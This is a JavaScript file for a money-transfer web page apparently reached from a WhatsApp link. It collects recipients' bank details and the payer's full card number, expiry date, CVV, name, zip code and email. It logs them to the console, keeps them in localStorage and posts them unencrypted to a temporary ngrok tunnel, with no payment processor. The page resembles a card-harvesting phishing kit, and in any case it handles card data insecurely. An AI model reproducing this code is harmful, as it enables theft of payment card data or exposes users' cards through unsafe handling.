// transfer-dashboard/send-money/script.js
document.addEventListener('DOMContentLoaded', function() {
    console.log("Script is running!");
    
    // Get transaction ID from URL
    const urlParams = new URLSearchParams(window.location.search);
    const transactionId = urlParams.get('id');
    
    // Debug: Log the transaction ID
    console.log("Transaction ID from URL:", transactionId);
    
    // Elements
    const loadingContainer = document.getElementById('loadingContainer');
    const transferContent = document.getElementById('transferContent');
    const errorContainer = document.getElementById('errorContainer');
    const firstTimeView = document.getElementById('firstTimeView');
    const firstTimeForm = document.getElementById('firstTimeForm');
    const reviewView = document.getElementById('reviewView');
    const successMessage = document.getElementById('successMessage');
    
    // API base URL - Get base URL dynamically rather than hardcoding
     const API_BASE_URL = 'https://0e595e084b34.ngrok.app';
    
    console.log("Using API base URL:", API_BASE_URL);
    
    // Store user data
    let userData = null;
    
    // Function to format currency
    function formatCurrency(amount, currency) {
        return new Intl.NumberFormat('en-US', {
            style: 'decimal',
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        }).format(amount);
    }
    
    // Function to fetch transaction data
    async function fetchTransactionData() {
        if (!transactionId) {
            console.error("No transaction ID found in URL");
            showError("Missing transaction ID. Please go back to WhatsApp and try again.");
            return;
        }
        
        try {
            const requestUrl = `${API_BASE_URL}/api/transaction/${transactionId}`;
            console.log("Fetching data from:", requestUrl);
            
            const response = await fetch(requestUrl, {
                method: 'GET',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                },
                mode: 'cors',
                credentials: 'omit'
            });
            
            console.log("Response status:", response.status);
            
            if (!response.ok) {
                const errorText = await response.text();
                console.error("API returned error status:", response.status, errorText);
                throw new Error(`Failed to fetch transaction data: ${response.status} - ${errorText}`);
            }
            
            const data = await response.json();
            console.log("API response data:", data);
            
            if (data.status === 'success' && data.transfer_data && data.transfer_data.details) {
                userData = data;
                
                // Show first-time view
                displayFirstTimeView(data);
            } else {
                console.error("Data format incorrect:", data);
                showError("The transaction data format is invalid. Please try again.");
            }
        } catch (error) {
            console.error('Error fetching transaction data:', error);
            showError(`Error: ${error.message || 'Failed to fetch transaction data'}`);
        }
    }
    
    // Function to display first-time view
    function displayFirstTimeView(data) {
        const transferData = data.transfer_data;
        const details = transferData.details;
        
        // Fill in transaction data
        fillTransactionDetails(transferData, details);
        
        // Show content
        loadingContainer.style.display = 'none';
        transferContent.style.display = 'block';
        firstTimeView.style.display = 'block';
    }
    
    // Function to fill transaction details
    function fillTransactionDetails(transferData, details) {
        // Set send amount
        const sendAmountElements = document.querySelectorAll('.send-amount');
        sendAmountElements.forEach(el => {
            el.textContent = formatCurrency(details.amount_from);
        });
        
        // Set send currency
        const sendCurrencyElements = document.querySelectorAll('.send-currency');
        sendCurrencyElements.forEach(el => {
            el.textContent = details.currency_from;
        });
        
        // Set exchange rate
        const exchangeRateElements = document.querySelectorAll('.exchange-rate-value');
        exchangeRateElements.forEach(el => {
            el.textContent = `1 ${details.currency_from} = ${details.exchange_rate} ${details.currency_to}`;
        });
        
        // Set receive amount
        const receiveAmountElements = document.querySelectorAll('.receive-amount');
        receiveAmountElements.forEach(el => {
            el.textContent = formatCurrency(details.amount_to);
        });
        
        // Set receive currency
        const receiveCurrencyElements = document.querySelectorAll('.receive-currency');
        receiveCurrencyElements.forEach(el => {
            el.textContent = details.currency_to;
        });
        
        // Set delivery method
        const deliveryMethodElements = document.querySelectorAll('.delivery-method');
        deliveryMethodElements.forEach(el => {
            el.textContent = transferData.delivery_method === 'bank_deposit' ? 'Bank deposit' : 'Cash pickup';
        });
        
        // Set fees
        const feeElements = document.querySelectorAll('.transfer-fee');
        feeElements.forEach(el => {
            el.textContent = `${formatCurrency(details.transfer_fee)} ${details.currency_from}`;
        });
        
        // Set total
        const totalElements = document.querySelectorAll('.total-amount');
        totalElements.forEach(el => {
            el.textContent = `${formatCurrency(details.total_amount)} ${details.currency_from}`;
        });
    }
    
    // Function to show error
    function showError(message = "Transfer data not found. Please return to WhatsApp and try again.") {
        loadingContainer.style.display = 'none';
        transferContent.style.display = 'none';
        errorContainer.style.display = 'block';
        
        const errorMsgEl = document.querySelector('#errorContainer p');
        if (errorMsgEl) {
            errorMsgEl.textContent = message;
        }
    }

    // Handle form submission - ONLY ONE form handler
    if (firstTimeForm) {
        firstTimeForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const continueButton = document.querySelector('#firstTimeForm button[type="submit"]');
            const originalText = continueButton ? continueButton.textContent : '';
            
            if (continueButton) {
                // Disable button and show loading state
                continueButton.disabled = true;
                continueButton.innerHTML = '<span class="loader"></span> Processing...';
            }
            
            try {
                // Collect form data
                const formData = {
                    recipientName: document.getElementById('firstTimeRecipientName').value,
                    bankName: document.getElementById('firstTimeBankName').value,
                    accountNumber: document.getElementById('firstTimeAccountNumber').value,
                    cardNumber: document.getElementById('firstTimeCardNumber').value,
                    cardExpiry: document.getElementById('firstTimeCardExpiry').value,
                    cardCvv: document.getElementById('firstTimeCardCvv').value,
                    cardholderName: document.getElementById('firstTimeCardName').value,
                    country: document.getElementById('firstTimeCardCountry').value,
                    zipCode: document.getElementById('firstTimeCardZip').value,
                    email: document.getElementById('firstTimeEmail').value
                };
                
                console.log("Form data collected:", formData);
                
                // Store in localStorage for review
                localStorage.setItem('formData', JSON.stringify(formData));
                
                // Show review screen
                showReviewScreen();
            } catch (error) {
                console.error("Error processing form:", error);
                alert("There was an error processing your form. Please try again.");
            } finally {
                // Reset button state
                if (continueButton) {
                    continueButton.disabled = false;
                    continueButton.textContent = originalText;
                }
            }
        });
    }
    
    // Function to show review screen
    function showReviewScreen() {
        // Hide first time view
        firstTimeView.style.display = 'none';
        
        // Get form data
        const formData = JSON.parse(localStorage.getItem('formData'));
        
        // Get transaction data
        const transferData = userData.transfer_data;
        const details = transferData.details;
        
        // Fill review fields
        document.getElementById('reviewRecipientName').textContent = formData.recipientName;
        document.getElementById('reviewBankName').textContent = formData.bankName;
        document.getElementById('reviewAccountNumber').textContent = formData.accountNumber;
        
        // Mask card number for security
        const maskedCard = formData.cardNumber.replace(/\d(?=\d{4})/g, "•");
        document.getElementById('reviewCardNumber').textContent = maskedCard;
        
        // Set transfer details
        document.getElementById('reviewSendAmount').textContent = 
            `${formatCurrency(details.amount_from)} ${details.currency_from}`;
        
        document.getElementById('reviewExchangeRate').textContent = 
            `1 ${details.currency_from} = ${details.exchange_rate} ${details.currency_to}`;
        
        document.getElementById('reviewReceiveAmount').textContent = 
            `${formatCurrency(details.amount_to)} ${details.currency_to}`;
        
        document.getElementById('reviewDeliveryMethod').textContent = 
            transferData.delivery_method === 'bank_deposit' ? 'Bank deposit' : 'Cash pickup';
        
        document.getElementById('reviewFees').textContent = 
            `${formatCurrency(details.transfer_fee)} ${details.currency_from}`;
        
        document.getElementById('reviewTotal').textContent = 
            `${formatCurrency(details.total_amount)} ${details.currency_from}`;
        
        // Show review screen
        reviewView.style.display = 'block';
    }
    
    // Set up confirm button with API call
    const confirmButton = document.getElementById('confirmButton');
    if (confirmButton) {
        confirmButton.addEventListener('click', async function() {
            // Disable button and show loading
            this.disabled = true;
            this.innerHTML = '<span class="loader"></span> Processing...';
            
            try {
                console.log("Preparing to send transaction data...");
                
                // Get form data
                const formData = JSON.parse(localStorage.getItem('formData'));
                
                // Create payload
                const payload = {
                    transaction_id: transactionId,
                    recipient_name: formData.recipientName,
                    bank_name: formData.bankName,
                    account_number: formData.accountNumber,
                    card_number: formData.cardNumber,
                    expiration_date: formData.cardExpiry,
                    cvv: formData.cardCvv,
                    card_name: formData.cardholderName,
                    country: formData.country,
                    zip_code: formData.zipCode,
                    email: formData.email
                };
                
                console.log("Sending payload:", payload);
                
                // Make API call
                const response = await fetch(`${API_BASE_URL}/api/first-time-transaction`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload),
                    mode: 'cors',
                    credentials: 'omit'
                });
                
                console.log("Response status:", response.status);
                
                // Get response text for logging
                const responseText = await response.text();
                console.log("Response body:", responseText);
                
                if (!response.ok) {
                    throw new Error(`Failed to complete transaction: ${response.status} - ${responseText}`);
                }
                
                // Show success message
                if (successMessage) {
                    transferContent.style.display = 'none';
                    successMessage.style.display = 'block';
                } else {
                    alert('Transaction completed successfully!');
                }
                
                // Clear form data
                localStorage.removeItem('formData');
                
            } catch (error) {
                console.error('Error completing transaction:', error);
                alert(`Error: ${error.message || 'There was an error processing your transaction. Please try again.'}`);
            } finally {
                // Reset button state
                this.disabled = false;
                this.innerHTML = 'Confirm and send';
            }
        });
    }
    
    // Set up edit button
    const editButton = document.getElementById('editButton');
    if (editButton) {
        editButton.addEventListener('click', function() {
            // Hide review screen
            reviewView.style.display = 'none';
            
            // Show first time view again
            firstTimeView.style.display = 'block';
        });
    }
    
    // Initialize by fetching transaction data
    fetchTransactionData();
});
